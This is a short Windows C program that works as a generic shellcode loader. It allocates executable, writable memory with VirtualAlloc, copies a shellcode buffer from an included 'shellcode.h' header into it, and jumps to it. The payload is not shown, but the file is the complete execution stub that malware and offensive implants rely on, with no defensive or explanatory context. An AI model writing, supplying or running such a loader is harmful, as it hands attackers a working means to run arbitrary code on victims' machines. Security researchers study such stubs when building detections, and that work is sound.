#include <windows.h>
#include <string.h>
#include "shellcode.h"

int main() {
    void *exec = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        return 1;
    }
    memcpy(exec, shellcode, shellcode_len);
    ((void(*)())exec)();
    return 0;
}
